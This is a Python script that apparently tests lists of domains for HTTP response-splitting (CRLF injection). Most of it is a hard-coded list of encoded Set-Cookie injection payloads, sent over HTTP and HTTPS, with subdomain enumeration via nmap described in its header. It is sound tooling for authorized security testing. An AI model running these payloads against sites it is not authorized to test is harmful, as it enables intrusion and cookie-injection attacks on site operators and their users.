#!/usr/bin/env python
# -*- coding:utf-8 -*-

# ------------------------------------------------------------------------------
# Test HTTP server to crlf-injection
#
# 1. get subdomain by dns-discovery (https://github.com/m0nad/DNS-Discovery)
#          or      by nmap (nmap -p 80 --script dns-brute.nse example.com)
# 2. depend at FUZZDB https://github.com/fuzzdb-project/fuzzdb
# 3. modify FUZZDB path (str.25)
# 4. usage: http_header_inj.py [-h] [-f FILE] [-t {D,N}] [-l LOGFILE]
# ------------------------------------------------------------------------------

import os,sys
import logging
import json
import requests
import hashlib
import time
import argparse
import re

# format output for logging
FORMAT = '%(asctime)-15s %(message)s'
FUZZDB = '../fuzzdb'

# colors for logging
class bcolors:
   HEADER = '\033[95m'
   OKBLUE = '\033[94m'
   OKGREEN = '\033[92m'
   WARNING = '\033[93m'
   FAIL = '\033[91m'
   ENDC = '\033[0m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'

# Params from command line
class Params(object):
    pass


class CrlfInj:
    def __init__(self):
        self.tmpl_file = FUZZDB + '/attack/http-protocol/crlf-injection.fuzz.txt'
        self.tmpl = [
            '/crlf_test/../',
            '/crlf_test/%2e%2e/',
            '/%0aSet-Cookie:crlf_test_cookie=crlf_test_val%0aX:/%2e%2e/',
            '/%0aSet-Cookie:crlf_test_cookie=crlf_test_val%0aX:/../',
            '/%0d%0aSet-Cookie:crlf_test_cookie=crlf_test_val%0d%0aX:/%2e%2e/',
            '/%0d%0aSet-Cookie:crlf_test_cookie=crlf_test_val%0d%0aX:/../',
            '/\\r\\nSet-Cookie:crlf_test_cookie=crlf_test_val\\r\\nX:/%2e%2e/',
            '/\\r\\nSet-Cookie:crlf_test_cookie=crlf_test_val\\r\\nX:/../',
            '/\\nSet-Cookie:crlf_test_cookie=crlf_test_val\\nX:/%2e%2e/',
            '/\\nSet-Cookie:crlf_test_cookie=crlf_test_val\\nX:/../',
            '/?crlf_test/../',
            '/?crlf_test/%2e%2e/',
            '/?%0aSet-Cookie:crlf_test_cookie=crlf_test_val%0aX:/%2e%2e/',
            '/?%0aSet-Cookie:crlf_test_cookie=crlf_test_val%0aX:/../',
            '/?%0d%0aSet-Cookie:crlf_test_cookie=crlf_test_val%0d%0aX:/%2e%2e/',
            '/?%0d%0aSet-Cookie:crlf_test_cookie=crlf_test_val%0d%0aX:/../',
            '/?\\r\\nSet-Cookie:crlf_test_cookie=crlf_test_val\\r\\nX:/%2e%2e/',
            '/?\\r\\nSet-Cookie:crlf_test_cookie=crlf_test_val\\r\\nX:/../',
            '/?\\nSet-Cookie:crlf_test_cookie=crlf_test_val\\nX:/%2e%2e/',
            '/?\\nSet-Cookie:crlf_test_cookie=crlf_test_val\\nX:/../',
            '/?lang=%c4%8d%c4%8aSet-Cookie:crlf_test_cookie=crlf_test_val%c4%8d%c4%8a%c4%8d%c4%8a',
            '/?lang=%c4%8aSet-Cookie:crlf_test_cookie=crlf_test_val',
            '/?lang=%E5%98%8A%E5%98%8DSet-Cookie:%20crlf_test_cookie=crlf_test_val',
            '/?lang=%E5%98%8D%E5%98%8ASet-Cookie:%20crlf_test_cookie=crlf_test_val',
            '/?lang=%E5%98%8ASet-Cookie:%20crlf_test_cookie=crlf_test_val'
        ]
        self.test_params = [
            'crlf_test',
            'Injected',
            'XSS',
            'ha.ckers.org',
        ]
        self.headers = {
            'User-Agent':'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.11.2; en-US; rv:1.9.0.5) Gecko/2008120121 Firefox/44'
        }
    def prepare(self):
        try:
            with open(self.tmpl_file,'r') as f:
                for line in f:
                    self.tmpl.append('/?' + line.strip())
                    self.tmpl.append('/' + line.strip() + '/')
                    self.tmpl.append('/' + line.strip() + '/../')
                    self.tmpl.append('/' + line.strip() + '/%2e%2e/')
        except Exception as e:
            logging.error(bcolors.FAIL + 'CrlfInj:prepare (%s)' + bcolors.ENDC, e)

    def do_it(self,url):
        for template in self.tmpl:
            uri = url + template
            try:
                r = requests.get(uri, headers = self.headers, timeout = 10)
                for test in self.test_params:
                    #if test in r.text:
                        #logging.warning(bcolors.WARNING + "uri (%s) - test (%s) - HTTP status_code (%s)" + bcolors.ENDC, uri, test, str(r.status_code))
                    for http_header in r.headers:
                        if test in http_header:
                            logging.warning(bcolors.OKBLUE + "uri (%s) - test (%s) - HTTP status_code (%s)" + bcolors.ENDC, uri, test, str(r.status_code))
                        elif test in r.headers[http_header]:
                            logging.warning(bcolors.OKGREEN + "uri (%s) - test (%s) - HTTP status_code (%s)" + bcolors.ENDC, uri, test, str(r.status_code))
            except requests.exceptions.Timeout as e:
                #logging.error(bcolors.FAIL + 'CrlfInj:do_it:uri(%s) - (%s)' + bcolors.ENDC, uri, e)
                return
            except Exception as e:
                #logging.error(bcolors.FAIL + 'CrlfInj:do_it:uri(%s) - (%s)' + bcolors.ENDC, uri, e)
                pass



def main():
    parser = argparse.ArgumentParser(description="Check domain for HTTP Injection")
    parser.add_argument('-f', dest = 'file', type = argparse.FileType('r'), help = 'file with domains list')
    parser.add_argument('-t', dest = 'type', choices = ['D','N'], type = str, help = 'D - dns-discovery, N - nmap with script dns-brute.nse')
    parser.add_argument('-l', dest = 'logfile', default='./lg.log', type = str, help = 'log file name')
    parser.parse_args(namespace=Params)

    # ----- go...

    # --- logging
    logging.basicConfig(filename = Params.logfile, format = FORMAT, level = logging.WARNING)

    # --- init tests

    # CRLF Injection
    crlf = CrlfInj()
    crlf.prepare()

    # read file with DNS answer
    for line in Params.file:
        if Params.type == 'D':
            re_tmpl = '^(https?:\/\/)?([\da-z\.-]+\.[a-z]{2,6}\.?)(\/[\w\.]*)*\/?$'
            domain = line.strip()
        elif Params.type == 'N':
            re_tmpl = '^(https?:\/\/)?([\da-z\.-]+\.[a-z]{2,6}\.?)(\/[\w\.]*)*\/?.*-.*$'
            domain = line.strip('|_').strip()

        p = re.compile(re_tmpl)
        match = re.search(p, domain)
        if match:
            domain = match.group(2)
            logging.warning(bcolors.BOLD + "domain: (%s)" + bcolors.ENDC, domain)
            url = 'http://' + domain
            crlf.do_it(url)
            url = 'https://' + domain
            crlf.do_it(url)


if __name__ == "__main__":
    main()
